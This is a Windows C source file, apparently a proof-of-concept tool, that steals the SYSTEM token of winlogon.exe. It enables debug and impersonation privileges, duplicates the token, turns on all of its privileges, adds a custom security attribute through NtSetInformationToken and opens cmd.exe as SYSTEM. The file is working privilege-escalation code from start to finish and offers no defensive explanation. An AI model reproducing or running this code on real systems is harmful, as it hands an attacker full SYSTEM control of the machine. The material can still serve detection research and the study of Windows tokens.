#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <strsafe.h>

#pragma comment(lib, "ntdll.lib")

#define CLAIM L"Grzegorz was here :)"

// Types - all defines to make code modification easier
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INVALID 0x00
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INT64 0x01
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64 0x02
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_STRING 0x03
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_FQBN 0x04
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_SID 0x05
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_BOOLEAN 0x06
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_OCTET_STRING 0x10

// Flags - all defines to make code modification easier
#define TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE 0x0001
#define TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE 0x0002
#define TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY 0x0004
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT 0x0008
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED 0x0010
#define TOKEN_SECURITY_ATTRIBUTE_MANDATORY 0x0020
#define TOKEN_SECURITY_ATTRIBUTE_COMPARE_IGNORE 0x0040
#define TOKEN_SECURITY_ATTRIBUTE_CUSTOM_FLAGS 0xffff0000

#define MAX_PRIVILEGE_NAME_LEN 64

// define PUNICODE_STRING on our own instead of #include <NTSecAPI.h>
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE
{
	ULONG64 Version;
	UNICODE_STRING Name;
} TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE, *PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE;

typedef struct _TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE
{
	PVOID pValue;
	ULONG ValueLength;
} TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE, *PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE;


typedef struct _TOKEN_SECURITY_ATTRIBUTE_V1
{
	UNICODE_STRING Name;
	USHORT ValueType;
	USHORT Reserved;
	ULONG Flags;
	ULONG ValueCount;

	union
	{
		PLONG64 pInt64;
		PULONG64 pUint64;
		PUNICODE_STRING pString;
		PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE pFqbn;
		PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE pOctetString;
	} Values;
} TOKEN_SECURITY_ATTRIBUTE_V1, *PTOKEN_SECURITY_ATTRIBUTE_V1;


typedef struct _TOKEN_SECURITY_ATTRIBUTE_RELATIVE_V1
{
	ULONG Name;
	USHORT ValueType;
	USHORT Reserved;
	ULONG Flags;
	ULONG ValueCount;

	union
	{
		ULONG pInt64[ANYSIZE_ARRAY];
		ULONG pUint64[ANYSIZE_ARRAY];
		ULONG ppString[ANYSIZE_ARRAY];
		ULONG pFqbn[ANYSIZE_ARRAY];
		ULONG pOctetString[ANYSIZE_ARRAY];
	} Values;
} TOKEN_SECURITY_ATTRIBUTE_RELATIVE_V1, *PTOKEN_SECURITY_ATTRIBUTE_RELATIVE_V1;


typedef struct _TOKEN_SECURITY_ATTRIBUTES_INFORMATION
{
	USHORT Version;
	USHORT Reserved;
	ULONG AttributeCount;

	union
	{
		PTOKEN_SECURITY_ATTRIBUTE_V1 pAttributeV1;
	} Attribute;
} TOKEN_SECURITY_ATTRIBUTES_INFORMATION, *PTOKEN_SECURITY_ATTRIBUTES_INFORMATION;


typedef enum _TOKEN_SECURITY_ATTRIBUTE_OPERATION
{
	TOKEN_SECURITY_ATTRIBUTE_OPERATION_NONE = 0,
	TOKEN_SECURITY_ATTRIBUTE_OPERATION_REPLACE_ALL,
	TOKEN_SECURITY_ATTRIBUTE_OPERATION_ADD,
	TOKEN_SECURITY_ATTRIBUTE_OPERATION_DELETE,
	TOKEN_SECURITY_ATTRIBUTE_OPERATION_REPLACE
} TOKEN_SECURITY_ATTRIBUTE_OPERATION, *PTOKEN_SECURITY_ATTRIBUTE_OPERATION;


typedef struct _TOKEN_SECURITY_ATTRIBUTES_AND_OPERATION_INFORMATION
{
	PTOKEN_SECURITY_ATTRIBUTES_INFORMATION Attributes;
	PTOKEN_SECURITY_ATTRIBUTE_OPERATION Operations;
} TOKEN_SECURITY_ATTRIBUTES_AND_OPERATION_INFORMATION, *PTOKEN_SECURITY_ATTRIBUTES_AND_OPERATION_INFORMATION;


__kernel_entry
NTSYSCALLAPI
NTSTATUS NtSetInformationToken(
	HANDLE TokenHandle,
	TOKEN_INFORMATION_CLASS TokenInformationClass,
	PVOID TokenInformation,
	ULONG TokenInformationLength
);


// no length checking. No real reason to expect input longer than USHORT/2.
VOID
InitUnicodeString(
	PUNICODE_STRING DestinationString,
	PWSTR SourceString
)
{
	USHORT length;
	DestinationString->Buffer = SourceString;
	length = (USHORT)wcslen(SourceString) * sizeof(WCHAR);
	DestinationString->Length = length;
	DestinationString->MaximumLength = (USHORT)(length + sizeof(UNICODE_NULL));
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		_tprintf(_T("ERROR: LookupPrivilegeValue() returned %u\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		_tprintf(_T("ERROR: AdjustTokenPrivileges() returned %u\n"), GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(_T("ERROR: The token does not have the specified privilege. %u\n"), GetLastError());
		return FALSE;
	}
	return TRUE;
}


DWORD getWinLogonPID(void)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32First(snapshot, &entry))
	{
		while (TRUE == Process32Next(snapshot, &entry))
		{
			if (0 == _tcscmp(entry.szExeFile, _T("winlogon.exe")))
			{
				_tprintf(_T("Winlogon PID: %d\n"), entry.th32ProcessID);
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


DWORD EnableAllPrivs(HANDLE hTokenHandle)
{
	DWORD dwTokenPrivilegeBytes;
	DWORD dwLastError;
	PTOKEN_PRIVILEGES pPrivs;
	BOOL bRes;

	//get the token information size, check if not zero
	GetTokenInformation(hTokenHandle, TokenPrivileges, NULL, 0, &dwTokenPrivilegeBytes);
	if (0 == dwTokenPrivilegeBytes)
	{
		dwLastError = GetLastError();
		_tprintf(_T("ERROR: GetTokenInformation() can't obtain TokenPrivileges size. Error %u\r\n"), dwLastError);
		return dwLastError;
	}

	//allocate buffer for storing token information
	pPrivs = LocalAlloc(LPTR, dwTokenPrivilegeBytes);
	if (NULL == pPrivs)
	{
		_tprintf(_T("ERROR: Cannot allocate buffer.\r\n"));
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}

	//put the token data to the buffer
	bRes = GetTokenInformation(
		hTokenHandle,
		TokenPrivileges,
		pPrivs,
		dwTokenPrivilegeBytes,
		&dwTokenPrivilegeBytes);
	if (!bRes)
	{
		dwLastError = GetLastError();
		_tprintf(_T("ERROR: GetTokenInformation() returned %u\r\n"), dwLastError);
		LocalFree(pPrivs);
		return dwLastError;
	}

	for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++)
	{
		pPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
	}

	bRes = AdjustTokenPrivileges(
		hTokenHandle,
		FALSE,
		pPrivs,
		0,
		NULL,
		NULL);
	if (!bRes)
	{
		dwLastError = GetLastError();
		_tprintf(_T("ERROR: AdjustTokenPrivileges() returned %u\r\n"), dwLastError);
		LocalFree(pPrivs);
		return dwLastError;
	}
	return 0;
}


int _tmain(void)
{
	HANDLE currentTokenHandle = NULL;
	BOOL bRes;

	bRes = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!bRes)
	{
		_tprintf(_T("ERROR: OpenProcessToken() returned %u\r\n"), GetLastError());
		return (int)GetLastError();
	}

	bRes = SetPrivilege(currentTokenHandle, SE_DEBUG_NAME);
	if (!bRes)
	{
		_tprintf(_T("ERROR: SetPrivilege(SE_DEBUG_NAME) failed with error code %u\r\n"), GetLastError());
		return (int)GetLastError();
	}

	bRes = SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME);
	if (!bRes)
	{
		_tprintf(_T("ERROR: SetPrivilege(SE_IMPERSONATE_NAME) failed with error code %u\r\n"), GetLastError());
		return (int)GetLastError();
	}


	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	HANDLE duplicateTokenHandle2 = NULL;
	DWORD dwPidToImpersonate;

	dwPidToImpersonate = getWinLogonPID();
	if (0 == dwPidToImpersonate)
	{
		_tprintf(_T("ERROR: PID of winlogon not found\r\n"));
		return ERROR_MOD_NOT_FOUND;
	}

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPidToImpersonate);
	if (NULL == processHandle)
	{
		_tprintf(_T("ERROR: OpenProcess() returned %u\r\n"), GetLastError());
		return (int)GetLastError();
	}

	bRes = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle);
	if (!bRes)
	{
		DWORD dwLastError = GetLastError();
		_tprintf(_T("ERROR: OpenProcessToken() returned %u\r\n"), GetLastError());
		CloseHandle(processHandle);
		return (int)dwLastError;
	}

	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;
	bRes = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle);
	if (!bRes)
	{
		DWORD dwLastError = GetLastError();
		_tprintf(_T("ERROR: DuplicateTokenEx() returned %u\r\n"), GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return (int)dwLastError;
	}

	(VOID)EnableAllPrivs(duplicateTokenHandle);

	bRes = ImpersonateLoggedOnUser(duplicateTokenHandle);
	if (!bRes)
	{
		DWORD dwLastError = GetLastError();
		_tprintf(_T("ERROR: ImpersonateLoggedOnUser() returned %u\r\n"), GetLastError());
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return (int)dwLastError;
	}

	bRes = DuplicateTokenEx(duplicateTokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle2);
	if (!bRes)
	{
		DWORD dwLastError = GetLastError();
		_tprintf(_T("ERROR: DuplicateTokenEx() returned %u\r\n"), GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return (int)dwLastError;
	}


	//all good with tokens, let's play

	NTSTATUS Status = 0;
	UNICODE_STRING usClaim;
	InitUnicodeString(&usClaim, CLAIM);

	TOKEN_SECURITY_ATTRIBUTES_AND_OPERATION_INFORMATION tsaoiData;
	TOKEN_SECURITY_ATTRIBUTE_V1 tsaData = {0};
	TOKEN_SECURITY_ATTRIBUTES_INFORMATION tsaiData = {0};
	TOKEN_SECURITY_ATTRIBUTE_OPERATION tsaoData;
	ULONG64 ulData = 0;

	tsaoData = TOKEN_SECURITY_ATTRIBUTE_OPERATION_REPLACE;
	tsaData.Name = usClaim;
	tsaData.ValueCount = 1;
	tsaData.ValueType = TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64;
	tsaData.Values.pUint64 = &ulData;

	tsaiData.Version = 1;
	tsaiData.Reserved = 0;
	tsaiData.AttributeCount = 1;
	tsaiData.Attribute.pAttributeV1 = &tsaData;
	tsaoiData.Attributes = &tsaiData;
	tsaoiData.Operations = &tsaoData;

	Status = NtSetInformationToken(
		duplicateTokenHandle2,
		TokenSecurityAttributes,
		&tsaoiData,
		sizeof(tsaoiData));

	if (Status != NO_ERROR)
	{
		_tprintf(_T("ERROR: nNtSetInformationToken() returned %u\r\n"), Status);
		return Status;
	}

	(VOID)EnableAllPrivs(duplicateTokenHandle2);

	//token ready, let's launch cmd

	const LPCWSTR cszCmdLine = L"\"C:\\Windows\\system32\\cmd.exe\"";
	PVOID lpCmdLine; //we need writable memory to make CreateProcessAsUserW working
	size_t dwCmdLineLen;
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = {0};

	//mess required by CreateProcessAsUserW()
	dwCmdLineLen = wcslen(cszCmdLine) + 1;
	lpCmdLine = (WCHAR*)LocalAlloc(LPTR, dwCmdLineLen * sizeof(WCHAR));
	if (!lpCmdLine)
	{
		_tprintf(_T("ERROR: Not enough memory.\r\n"));
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}
	(VOID)StringCchCopy(lpCmdLine, dwCmdLineLen, cszCmdLine); //assume no error

	si.cb = sizeof(si);
	si.lpDesktop = L"Winsta0\\Default";


	//create process with the token duplicated above
	_tprintf(_T("CreateProcessAsUserW() ... "));
	CreateProcessAsUserW(
		duplicateTokenHandle2,
		NULL,
		lpCmdLine,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	_tprintf(_T("returned %ld\r\n\r\n"), GetLastError());


	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	return 0;
}
